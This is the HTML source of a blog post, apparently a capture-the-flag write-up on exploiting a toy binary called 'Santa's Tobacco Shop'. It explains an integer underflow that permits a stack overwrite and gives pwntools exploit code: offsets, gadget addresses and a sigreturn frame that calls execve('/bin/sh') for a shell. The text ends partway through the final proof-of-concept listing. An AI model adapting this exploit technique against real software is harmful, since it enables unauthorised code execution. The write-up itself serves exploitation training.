@@ -1,0 +1,597 @@
+<!DOCTYPE html>
+<html lang="en" itemscope itemtype="http://schema.org/WebPage">
+  <head>
+    
+
+  <meta charset="utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+
+  <title>XMAS Pwn: Santa&#39;s Tobacco Shop - memN0ps</title>
+  <meta name="description" content="Sigreturn-Oriented Programming (SROP) Vulnerability Analysis We take a look at the main function in IDA graph view and can see that a system call is made. We can quickly determine what function is being called by looking at system call number inside the EAX register before the system call. Also IDA has detected that the write function is called. We can confirm this by looking at system call table which shows that 1 is the system call number for write.">
+  <meta name="author" content="memN0ps"/><script type="application/ld+json">
+{
+    "@context": "http://schema.org",
+    "@type": "WebSite",
+    "name": "memN0ps",
+    
+    "url": "https:\/\/memn0ps.github.io\/"
+}
+</script><script type="application/ld+json">
+{
+  "@context": "http://schema.org",
+  "@type": "Organization",
+  "name": "",
+  "url": "https:\/\/memn0ps.github.io\/"
+  
+  
+  
+  
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "http://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [{
+        "@type": "ListItem",
+        "position": 1,
+        "item": {
+          "@id": "https:\/\/memn0ps.github.io\/",
+          "name": "home"
+        }
+    },{
+        "@type": "ListItem",
+        "position": 3,
+        "item": {
+          "@id": "https:\/\/memn0ps.github.io\/XMAS-Pwn-Santa-Tobacco-Shop\/",
+          "name": "Xmas pwn santa\u0027s tobacco shop"
+        }
+    }]
+}
+</script><script type="application/ld+json">
+{
+  "@context": "http://schema.org",
+  "@type": "Article",
+  "author": {
+    "name" : "memN0ps"
+  },
+  "headline": "XMAS Pwn: Santa\u0027s Tobacco Shop",
+  "description" : "Sigreturn-Oriented Programming (SROP) Vulnerability Analysis We take a look at the main function in IDA graph view and can see that a system call is made. We can quickly determine what function is being called by looking at system call number inside the EAX register before the system call. Also IDA has detected that the write function is called. We can confirm this by looking at system call table which shows that 1 is the system call number for write.",
+  "inLanguage" : "en",
+  "wordCount":  2733 ,
+  "datePublished" : "2021-12-22T00:00:00",
+  "dateModified" : "2021-12-22T00:00:00",
+  "image" : "https:\/\/memn0ps.github.io\/avatar-icon.jpg",
+  "keywords" : [ "" ],
+  "mainEntityOfPage" : "https:\/\/memn0ps.github.io\/XMAS-Pwn-Santa-Tobacco-Shop\/",
+  "publisher" : {
+    "@type": "Organization",
+    "name" : "https:\/\/memn0ps.github.io\/",
+    "logo" : {
+        "@type" : "ImageObject",
+        "url" : "https:\/\/memn0ps.github.io\/avatar-icon.jpg",
+        "height" :  60 ,
+        "width" :  60
+    }
+  }
+}
+</script>
+
+<meta property="og:title" content="XMAS Pwn: Santa&#39;s Tobacco Shop" />
+<meta property="og:description" content="Sigreturn-Oriented Programming (SROP) Vulnerability Analysis We take a look at the main function in IDA graph view and can see that a system call is made. We can quickly determine what function is being called by looking at system call number inside the EAX register before the system call. Also IDA has detected that the write function is called. We can confirm this by looking at system call table which shows that 1 is the system call number for write.">
+<meta property="og:image" content="https://memn0ps.github.io/avatar-icon.jpg" />
+<meta property="og:url" content="https://memn0ps.github.io/XMAS-Pwn-Santa-Tobacco-Shop/" />
+<meta property="og:type" content="website" />
+<meta property="og:site_name" content="memN0ps" />
+
+  <meta name="twitter:title" content="XMAS Pwn: Santa&#39;s Tobacco Shop" />
+  <meta name="twitter:description" content="Sigreturn-Oriented Programming (SROP) Vulnerability Analysis We take a look at the main function in IDA graph view and can see that a system call is made. We can quickly determine what function is …">
+  <meta name="twitter:image" content="https://memn0ps.github.io/avatar-icon.jpg" />
+  <meta name="twitter:card" content="summary" />
+  <meta name="twitter:site" content="@memN0ps" />
+  <meta name="twitter:creator" content="@memN0ps" />
+  <link href='https://memn0ps.github.io/avatar-icon.jpg' rel='icon' type='image/x-icon'/>
+  <meta name="generator" content="Hugo 0.93.1" />
+  <link rel="alternate" href="https://memn0ps.github.io/index.xml" type="application/rss+xml" title="memN0ps"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css" integrity="sha384-9eLZqc9ds8eNjO3TmqPeYcDj8n+Qfa4nuSiGYa6DjLNcv9BtN69ZIulL9+8CqC9Y" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.5.0/css/all.css" integrity="sha384-B4dIYHKNBt8Bc12p+WXckhzcICo0wtJAoU8YZTY5qE0Id1GSseTk6S+L3BlXeVIU" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous"><link rel="stylesheet" href="https://memn0ps.github.io/css/main.css" /><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic" />
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" /><link rel="stylesheet" href="https://memn0ps.github.io/css/syntax.css" /><link rel="stylesheet" href="https://memn0ps.github.io/css/codeblock.css" /><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe.min.css" integrity="sha384-h/L2W9KefUClHWaty3SLE5F/qvc4djlyR4qY3NUV5HGQBBW7stbcfff1+I/vmsHh" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/default-skin/default-skin.min.css" integrity="sha384-iD0dNku6PYSIQLyfTOpB06F2KCZJAKLOThS5HRe8b3ibhdEQ6eKsFf/EeFxdOt5R" crossorigin="anonymous">
+
+
+
+  </head>
+  <body>
+    <nav class="navbar navbar-default navbar-fixed-top navbar-custom">
+  <div class="container-fluid">
+    <div class="navbar-header">
+      <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#main-navbar">
+        <span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+      <a class="navbar-brand" href="https://memn0ps.github.io/">memN0ps</a>
+    </div>
+
+    <div class="collapse navbar-collapse" id="main-navbar">
+      <ul class="nav navbar-nav navbar-right">
+        
+
+        
+
+        
+      </ul>
+    </div>
+
+    
+      <div class="avatar-container">
+        <div class="avatar-img-border">
+          <a title="memN0ps" href="https://memn0ps.github.io/">
+            <img class="avatar-img" src="https://memn0ps.github.io/avatar-icon.jpg" alt="memN0ps" />
+          </a>
+        </div>
+      </div>
+    
+
+  </div>
+</nav>
+
+
+
+
+    
+
+
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+<div class="pswp__bg"></div>
+
+<div class="pswp__scroll-wrap">
+    
+    <div class="pswp__container">
+      <div class="pswp__item"></div>
+      <div class="pswp__item"></div>
+      <div class="pswp__item"></div>
+    </div>
+    
+    <div class="pswp__ui pswp__ui--hidden">
+    <div class="pswp__top-bar">
+      
+      <div class="pswp__counter"></div>
+      <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+      <button class="pswp__button pswp__button--share" title="Share"></button>
+      <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+      <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+      
+      
+      <div class="pswp__preloader">
+        <div class="pswp__preloader__icn">
+          <div class="pswp__preloader__cut">
+            <div class="pswp__preloader__donut"></div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+      <div class="pswp__share-tooltip"></div>
+    </div>
+    <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+    </button>
+    <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+    </button>
+    <div class="pswp__caption">
+      <div class="pswp__caption__center"></div>
+    </div>
+    </div>
+    </div>
+</div>
+
+
+  
+  
+  
+
+
+
+
+
+
+  
+
+  <header class="header-section ">
+    
+    <div class="intro-header no-img">
+      <div class="container">
+        <div class="row">
+          <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+            <div class="post-heading">
+              
+                <h1>XMAS Pwn: Santa&#39;s Tobacco Shop</h1>
+              
+              
+              
+              
+                <span class="post-meta">
+  
+  
+  <i class="fas fa-calendar"></i>&nbsp;Posted on December 22, 2021
+  
+  
+  
+  
+    
+      &nbsp;|&nbsp;<i class="fas fa-user"></i>&nbsp;memN0ps
+    
+  
+  
+</span>
+
+
+              
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </header>
+
+
+    
+<div class="container" role="main">
+  <div class="row">
+    <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+      <article role="main" class="blog-post">
+        <h2 id="sigreturn-oriented-programming-srop">Sigreturn-Oriented Programming (SROP)</h2>
+<h2 id="vulnerability-analysis">Vulnerability Analysis</h2>
+<p>We take a look at the main function in IDA graph view and can see that a system call is made. We can quickly determine what function is being called by looking at system call number inside the <code>EAX</code> register before the system call. Also IDA has detected that the <code>write</code> function is called. We can confirm this by looking at <a href="https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md">system call table</a> which shows that <code>1</code> is the system call number for <code>write</code>.</p>
+<p>This is what prints the string <code>&quot;Welcome to Santa's Tobbaco Shop....&quot;</code> when we run the program.</p>
+<p>Right after that we can see another function being called, <code>sub_4010EB</code> which we will deep dive inside soon. After <code>sub_4010EB</code> we can see that <code>write()</code> is called again that will print <code>&quot;Goodbyte!\n&quot;</code>. After this function the program exits by calling <code>exit()</code> that has the system call number of <code>60</code> which is just <code>0x3C</code> in hex.</p>
+<p><img src="/XMAS-Pwn-Santa-Tobacco-Shop/main_function.png" alt="main_function.png"></p>
+<p>The <code>call sub_4010EB</code> will places the return address on the stack. The return address is the memory location of the instruction after <code>call sub_4010EB</code>, which is <code>mov eax, 1</code>.</p>
+<p>This is what the entire function looks like in IDA&rsquo;s graph view:</p>
+<p><img src="/XMAS-Pwn-Santa-Tobacco-Shop/vulnerable_function_graph.png" alt="vulnerable_function_graph.png"></p>
+<p>The best thing to do is breakdown each section and try not to get overwhelmed.</p>
+<p>Looking inside this function (<code>sub_4010EB</code>) we can see the function prologue:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nf">push</span> <span class="no">rbp</span>		<span class="c">; save old base pointer
+</span></span></span><span class="line"><span class="cl"><span class="c"></span><span class="no">mov</span> <span class="no">rbp</span><span class="p">,</span> <span class="no">rsp</span>	<span class="c">; set new base pointer
+</span></span></span><span class="line"><span class="cl"><span class="c"></span><span class="no">push</span> <span class="mi">0</span><span class="no">E8</span>		<span class="c">; push 232 on the stack
+</span></span></span><span class="line"><span class="cl"><span class="c"></span><span class="no">sub</span> <span class="no">rsp</span><span class="p">,</span> <span class="mi">0x100</span>	<span class="c">; allocate 0x100 bytes on the stack
+</span></span></span></code></pre></div><p>This will push the base pointer (<code>old RBP</code>) on the stack and move the stack pointer inside the <code>RBP</code> register.</p>
+<p>The <code>push 0E8</code> instruction pushes the number <code>0xE8</code> which is <code>232</code> in decimal, on the stack. Usually this is not part of function prologue. I will refer to this as the <code>loop counter or loop index</code> so we can remember and reference it easily later. This is number is important and will become obvious to us later.</p>
+<p>The <code>sub rsp, 0x100</code> allocates a stack frame by subtracting <code>256</code> bytes from the stack.</p>
+<p><img src="/XMAS-Pwn-Santa-Tobacco-Shop/vulnerable_function_code_0.png" alt="vulnerable_function_code_0.png"></p>
+<p>The next part shows that a system call is made calling the <code>write()</code> function. The first argument is <code>EDI</code>, the second argument is <code>RSI</code> and the 3rd <code>RDX</code>. <code>RAX</code> is just the system call number. Here is the function signature: <code>ssize_t write(int _fd, const void *buf, size_t count);</code>. This will just print <code>&quot;What brand of cigarettes would you like...&quot;</code></p>
+<p>Next, the <code>read()</code> function is called which will take input from the terminal and the function signature looks like: <code>ssize_t read(int fd, void *buf, size_t count);</code>. The important thing to note here is that. This will attempt to read <code>8</code> bytes from the file descriptor into the buffer.</p>
+<p>An important this to note is that the buffer is stored inside the <code>.bss</code> section and since the binary does not have Position Independent Executable (PIE) enabled the offset will always be the same. This will be very important to use in the future.</p>
+<p><img src="/XMAS-Pwn-Santa-Tobacco-Shop/buffer_bss_location.png" alt="buffer_bss_location.png"></p>
+<p>Here we can see that our buffer / input is compared with the value <code>&quot;/quit&quot;</code>.</p>
+<p>You can read more about the <a href="https://sites.google.com/site/microprocessorsbits/string-instructions/repe-repne-repz-repnz">repe instruction</a> and <a href="https://sites.google.com/site/microprocessorsbits/string-instructions/cmps-cmpsb-cmpsw">cmpsb instruction</a> but in a nutshell the combination of these instructions compares bytes till a difference is found. This is the equivalent of <code>memcmp()</code> function in C.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nf">mov</span> <span class="no">ecx</span><span class="p">,</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl"><span class="nf">mov</span> <span class="no">rdi</span><span class="p">,</span> <span class="no">offset</span> <span class="no">aQuit</span> <span class="c">; &#34;/quit&#34;
+</span></span></span><span class="line"><span class="cl"><span class="c"></span><span class="no">mov</span> <span class="no">rsi</span><span class="p">,</span> <span class="no">offset</span> <span class="no">buffer</span>
+</span></span><span class="line"><span class="cl"><span class="na">rep</span><span class="nf">e</span> <span class="no">cmpsb</span>
+</span></span><span class="line"><span class="cl"><span class="nf">jz</span> <span class="no">short</span> <span class="no">locret_401193</span>
+</span></span></code></pre></div><p><img src="/XMAS-Pwn-Santa-Tobacco-Shop/vulnerable_function_code_1.png" alt="vulnerable_function_code_1.png"></p>
+<p>This means that even if we enter the string <code>/</code> the zero flag will be set and we will take the jump and land inside the function epilogue (quit program).</p>
+<p>The function epilogue looks like this:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nf">leave</span>	<span class="c">; mov rbp, rsp and pop rbp (release stack frame and restore the old RBP)
+</span></span></span><span class="line"><span class="cl"><span class="c"></span><span class="no">retn</span>	<span class="c">; pop RIP
+</span></span></span></code></pre></div><p>This will release the stack frame / deallocate memory, restore old RBP and resume execution flow by popping the value placed on the stack at the time the function was called.</p>
+<p><img src="/XMAS-Pwn-Santa-Tobacco-Shop/vulnerable_function_code_2.png" alt="vulnerable_function_code_2.png"></p>
+<p>If the jump is not taken then the next 2 instructions will check if value located at <code>rbp+var_8</code> is greater than <code>0xC8</code> which is <code>200</code>. The location at <code>rbp+var_8</code> is our loop index/counter. if it is greater than <code>200</code> then the jump is taken otherwise <code>&quot;You came here more than four time!....&quot;</code> is printed via a <code>write()</code> function using a system call. After that, 8 is subtracted from the loop index and the loop continues but we will look at that later.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nf">cmp</span> <span class="no">word</span> <span class="no">ptr</span> <span class="p">[</span><span class="no">rbp</span><span class="err">+</span><span class="no">var_8</span><span class="p">],</span> <span class="mi">0</span><span class="no">C8</span>
+</span></span><span class="line"><span class="cl"><span class="nf">ja</span> <span class="no">short_loc_401173</span>
+</span></span></code></pre></div><p><img src="/XMAS-Pwn-Santa-Tobacco-Shop/vulnerable_function_code_3.png" alt="vulnerable_function_code_3.png"></p>
+<p>if the jump is taken then the following instructions are execute:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nf">mov</span> <span class="no">bx</span><span class="p">,</span> <span class="no">word</span> <span class="no">ptr</span> <span class="p">[</span><span class="no">rbp</span><span class="err">+</span><span class="no">var_8</span><span class="p">]</span>    <span class="c">; our loop counter
+</span></span></span><span class="line"><span class="cl"><span class="c"></span><span class="no">movzx</span> <span class="no">rax</span><span class="p">,</span><span class="no">bx</span>
+</span></span><span class="line"><span class="cl"><span class="nf">add</span> <span class="no">rax</span><span class="p">,</span> <span class="no">rsp</span>                    <span class="c">; RSP added with our loop counter
+</span></span></span><span class="line"><span class="cl"><span class="c"></span><span class="no">mov</span> <span class="no">rbx</span><span class="p">,</span> <span class="no">ds</span><span class="p">:</span><span class="no">buffer</span>              <span class="c">; our buffer
+</span></span></span><span class="line"><span class="cl"><span class="c"></span><span class="no">mov</span> <span class="p">[</span><span class="no">rax</span><span class="p">],</span> <span class="no">rbx</span>                  <span class="c">; [rax] is some location on the stack
+</span></span></span></code></pre></div><p>This will move the value located at <code>rbp+var_8</code> inside <code>bx</code> which is then moved inside <code>rax</code>. The value of <code>rax</code> is added with the stack pointer (<code>rsp</code>) and stored back in <code>rax</code>. Then our buffer is placed inside <code>rbx</code> and then <code>rbx</code> is placed inside the location or value of <code>rax</code> by dereferencing it.</p>
+<p>After that 8 bytes are subtracted from the value located inside <code>rbp+var_8</code> and a jump is made back to <code>loc_4010Fb</code>. The value located at <code>rbp+var_8</code> is our loop index.</p>
+<p><img src="/XMAS-Pwn-Santa-Tobacco-Shop/vulnerable_function_code_4.png" alt="vulnerable_function_code_4.png"></p>
+<p>This means the program is in a continuously loop starting at index <code>232</code> and our loop counter is located at <code>rbp+var_8</code> with the initial value of <code>232</code>. In each iteration of the loop <code>8</code> bytes are subtracted from <code>232</code> and our input is read from and stored inside a <code>buffer</code> which is located at specific offset in  <code>.bss</code>  segment. if we input &ldquo;<code>/quit</code>&rdquo; or even the character <code>&quot;/&quot;</code> the program is terminated. Also if the loop counter is greater than <code>200</code> (<code>0xC8</code>) then our <code>buffer</code> is placed inside the memory location of a <code>variable</code> with an index of the loop counter that is located on the stack.</p>
+<p>Confused yet? :P No problem. I always love to try and understand the program by looking at the Assembly code/instructions and because it is good practice. Besides pseudocode is not always 100% accurate.</p>
+<h2 id="disassemble">Disassemble</h2>
+<p>The free version of IDA, Ghidra, Radare Cutter or Binary Ninja offers disassembly to C pseudocode.</p>
+<p>We can press <code>F5</code> in IDA Freeware to see the C code to gain a better understanding of the program.</p>
+<p><img src="/XMAS-Pwn-Santa-Tobacco-Shop/vulnerable_function_code.png" alt="vulnerable_function_code.png"></p>
+<p>We can see the program does what exactly what was explained above. So there are a few things to note here:</p>
+<ol>
+<li>Our input is read and stored inside <code>buffer</code>  which is at an offset located in <code>.bss</code> segment temporary and we are only allowed to enter 8 bytes including the <code>\n</code> character.</li>
+<li>The loop index starts are <code>232</code> and if the <code>index</code> is &gt; <code>200</code> then the following line is executed <code>*(_QWORD *)&amp;v3[(unsigned _int16)i] = *(_QWORD *)buffer;</code> else a string is printed.</li>
+<li><code>v3</code> is a <code>256</code> byte array</li>
+<li>The function prologue showed us that <code>256</code> bytes were allocated (<code>0x100</code>) on the stack</li>
+<li>inputting <code>/</code> will exit the program and return result.</li>
+</ol>
+<h2 id="the-bug">The Bug</h2>
+<p>Since we are only allowed to input 8 bytes and the stack has <code>256</code> bytes of memory, to overwrite the return address we need to do send <code>256 + 8 + 8 + 8 = 280</code>. Why?</p>
+<p>Because <code>_BYTE v3[256];</code> is <code>256</code> bytes and underneath that variable is <code>_int64 i;</code> which is <code>8</code> bytes + <code>8</code> will be old <code>RBP</code> and + <code>8</code> will be the return address. All of these variable are on the stack. They look like this:</p>
+<pre tabindex="0"><code>_BYTE v3[256]; 			// 256 bytes
+_int64 i; 				// 8 bytes
+RBP						// 8 bytes 
+return address 			// 8 bytes
+</code></pre><p>But how do we send <code>280</code> bytes?</p>
+<p>The answer is here.</p>
+<ol>
+<li>The address of <code>v3</code> at position <code>i</code> is casted to <code>QWORD</code> pointer and then de-referenced.</li>
+<li>Our buffer is casted to <code>QWORD</code> pointer and then de-referenced.</li>
+<li>Our buffer is placed in a location on the stack which is determined by our index.</li>
+</ol>
+<p>Take a look at this line.
+<code>*(_QWORD *)&amp;v3[(unsigned _int16)i] = *(_QWORD *)buffer;</code></p>
+<p>The problem is that our index or loop counter is an <code>int64</code> and is casted to an <code>unsigned __int16</code> which at each iteration is decreased by <code>8</code> bytes. This will cause an <code>integer underflow</code>.</p>
+<p>An <code>unsigned __int16</code> goes from is <code>0 to 65,535</code> but if we include the 0 that is <code>65536</code>. We want the index to be <code>v3[272]</code> because anything after that will overwrite the return address. The index is decreased by <code>8</code> each iteration of the loop and <code>if index &gt; 200</code> then the buffer is placed in a location on the stack.</p>
+<p>We want our index to be <code>v3[272]</code> but it starts with <code>232</code> and when <code>232</code> hits <code>0</code> it starts from <code>65535</code> and then continues to have <code>8</code> subtracted from it. Also an important thing to note is that we can only send <code>8</code> bytes and at each iteration  <code>8</code> bytes are subtracts from the index. This may sound confusing at first but it helps to debug the program using <code>GDB</code> with <code>GEF</code> and use <code>pwntools</code> to send the payload.</p>
+<h2 id="calculation">Calculation</h2>
+<p>Based on the information provided we can calculate the offset with this formula <code>272 - 232 = 40</code> and <code>65536 - 40 = 65496</code>. The offset is at <code>65496</code>, this means we need to loop <code>65496</code> until the index is <code>v3[272]</code> and our buffer is placed on this location on the stack as shown here: <code>*(_QWORD *)&amp;v3[(unsigned _int16)i] = *(_QWORD *)buffer;</code></p>
+<p>After sending this payload we successfully overwrite the return address. But we need to ensure we use <code>p.send()</code> instead of <code>p.sendline()</code> as <code>p.sendline()</code> includes a <code>\n</code> character.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python3" data-lang="python3"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">send_buffer</span><span class="p">(</span><span class="n">payload</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;What brand of cigarettes would you like to buy today? (/quit to leave)</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># offset at 65496</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;A&#34;</span> <span class="o">*</span> <span class="mi">65496</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;B&#34;</span> <span class="o">*</span> <span class="mi">8</span>
+</span></span><span class="line"><span class="cl"><span class="n">send_buffer</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span></code></pre></div><p>However, another problem occurs. Given that this program does not have any memory protections, the remote operating system will have <code>ALSR</code> enabled and we do not have a <code>JMP ESP</code> gadget inside the program to jump the the location of our shellcode.</p>
+<pre tabindex="0"><code>Canary                        : ✘ 
+NX                            : ✘ 
+PIE                           : ✘ 
+Fortify                       : ✘ 
+RelRO                         : Partial
+</code></pre><p>So what do we do?</p>
+<h2 id="sigreturn-oriented-programming">Sigreturn-Oriented-Programming</h2>
+<p>A <a href="https://man7.org/linux/man-pages/man2/sigreturn.2.html"><strong>sigreturn</strong></a> is a system call that returns from a signal handler to clean up the stack frame after the signal has been unblocked. The system call number for this is <code>15</code> in decimal and <code>0xf</code> in hex.</p>
+<p>The kernel pauses a process&rsquo;s execution when a signal occurs to jump to a signal handler routine. To ensure that the execution is safely resumed after the signal handler, the state or context of all the registers and flags are preserved/saved/pushed on the stack. However, in order to restore the state or context of all registers <code>sigreturn()</code> is called, when the signal handler is finished or completed, which will pop the values off the stack back into the registers.</p>
+<h3 id="sigcontext-structure">Sigcontext Structure</h3>
+<p>The length of the <code>sigcontext</code> structure is <code>248</code> bytes if we exclude <code>rt_sigreturn()</code> which is <code>8</code> bytes. The image below shows the order in which the stack must be to control the values popped into the registers.</p>
+<p><img src="/XMAS-Pwn-Santa-Tobacco-Shop/Sigcontext_structure.png" alt="Sigcontext_structure.png"></p>
+<p>Luckily for us we don&rsquo;t need to set this up the manual way. Thanks to pwntools :).</p>
+<h2 id="pwntools">Pwntools</h2>
+<p>Note that one of gadgets is inside the binary, moves <code>0xf</code> to <code>eax</code> and then executes a <code>syscall</code>. This will be very handy to us because we need to set the value of <code>EAX</code> / <code>RAX</code> to <code>0xf</code> which is the system call number for <code>rt_sigreturn()</code>.</p>
+<p>Note you can use <a href="https://github.com/sashs/Ropper">ropper</a> to find gadgets inside the binary. We can see also look inside IDA that there is some unused code which will be useful to us.</p>
+<p><code>0x0000000000401199: mov eax, 0xf; nop; syscall;</code></p>
+<p><img src="/XMAS-Pwn-Santa-Tobacco-Shop/sig_gadget_ida.png" alt="sig_gadget_ida.png"></p>
+<p>We can can use the <a href="https://docs.pwntools.com/en/stable/rop/srop.html">SigreturnFrame</a> function from pwntools and place the values we need inside the registers.</p>
+<p>The code below will place the <code>0x3b</code> inside <code>frame.rax</code> which is a system call number for <a href="https://man7.org/linux/man-pages/man2/execve.2.html">int execve(const char *pathname, char *const argv[], char *const envp[]);</a> and note that <code>frame.rip</code> is overwritten with a system call gadget <code>0x0000000000401114</code>.</p>
+<p><code>frame.rdi</code> has the value of <code>0x0000000000402001</code> because that is where our temporary <code>buffer</code> is stored after read. The trick is to quit using <code>&quot;&quot;//bin/sh\x00&quot;&quot;</code> because one of those slashes is for quitting and the other for our <code>/bin/sh</code> string, since there is no other location to store our <code>/bin/sh</code> string at a constant address that does not change. The <code>execve</code> requires a pointer to <code>/bin/sh</code> and that is the only way we can put <code>/bin/sh</code> inside the binary since that does not exist in the program already.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python3" data-lang="python3"><span class="line"><span class="cl"><span class="c1">## Frame to call execve using SigreturnFrame for x86-64</span>
+</span></span><span class="line"><span class="cl"><span class="n">frame</span> <span class="o">=</span> <span class="n">SigreturnFrame</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="s2">&#34;amd64&#34;</span><span class="p">,</span> <span class="n">kernel</span><span class="o">=</span><span class="s2">&#34;amd64&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">frame</span><span class="o">.</span><span class="n">rax</span> <span class="o">=</span> <span class="mh">0x3b</span>                <span class="c1"># syscall number for execve</span>
+</span></span><span class="line"><span class="cl"><span class="n">frame</span><span class="o">.</span><span class="n">rdi</span> <span class="o">=</span> <span class="mh">0x0000000000402001</span>  <span class="c1"># pointer to the .bss/data segment (/bin/sh 0x68732f2f6e69622f)</span>
+</span></span><span class="line"><span class="cl"><span class="n">frame</span><span class="o">.</span><span class="n">rsi</span> <span class="o">=</span> <span class="mh">0x0</span>                 <span class="c1"># NULL</span>
+</span></span><span class="line"><span class="cl"><span class="n">frame</span><span class="o">.</span><span class="n">rdx</span> <span class="o">=</span> <span class="mh">0x0</span>                 <span class="c1"># NULL</span>
+</span></span><span class="line"><span class="cl"><span class="n">frame</span><span class="o">.</span><span class="n">rsp</span> <span class="o">=</span> <span class="mh">0xdeadbeef</span>          <span class="c1"># 0xdeadbeef for testing</span>
+</span></span><span class="line"><span class="cl"><span class="n">frame</span><span class="o">.</span><span class="n">rip</span> <span class="o">=</span> <span class="mh">0x0000000000401114</span>  <span class="c1"># 0x0000000000401114: syscall;</span>
+</span></span></code></pre></div><p>Another tricky part to this challenge is that since the buffer overflow is from high to low addresses rather than the usual low to high addresses, we need to reverse the frame. This is normally not needed but since this is an int underflow that fills our buffer in reverse, we have to reverse our <code>frame</code> payload.</p>
+<p>This can easily be done with the following:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># Reverse the frame and convert to bytes</span>
+</span></span><span class="line"><span class="cl"><span class="n">new_frame</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="n">frame</span><span class="o">.</span><span class="n">values</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl"><span class="n">new_frame</span><span class="o">.</span><span class="n">reverse</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">send_buffer</span><span class="p">(</span><span class="n">flat</span><span class="p">(</span><span class="n">new_frame</span><span class="p">))</span>
+</span></span></code></pre></div><h2 id="final-poc">Final PoC</h2>
+<p>In the final PoC, we used  <code>payload = &quot;A&quot; * (65496 - len(frame))</code> to minus the length of the frame. We then sent our <code>send_buffer(flat(new_frame))</code> reversed frame and then overwrote the return address with address <code>0x0000000000401199: mov eax, 0xf; nop; syscall;</code>. We then made sure we quit the program with <code>send_buffer(&quot;//bin/sh\x00&quot;)</code> and drop an interactive shell.</p>
+<p>This will call <code>rt_sigreturn()</code> and pop values located at specific locations on the stack into the registers. Our registers will have the values that we put in our frame which will call <code>execve</code> giving us a shell.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">frame</span> <span class="o">=</span> <span class="n">SigreturnFrame</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="s2">&#34;amd64&#34;</span><span class="p">,</span> <span class="n">kernel</span><span class="o">=</span><span class="s2">&#34;amd64&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">frame</span><span class="o">.</span><span class="n">rax</span> <span class="o">=</span> <span class="mh">0x3b</span>                <span class="c1"># syscall number for execve</span>
+</span></span><span class="line"><span class="cl"><span class="n">frame</span><span class="o">.</span><span class="n">rdi</span> <span class="o">=</span> <span class="mh">0x0000000000402001</span>  <span class="c1"># pointer to the .bss/data segment (/bin/sh 0x68732f2f6e69622f)</span>
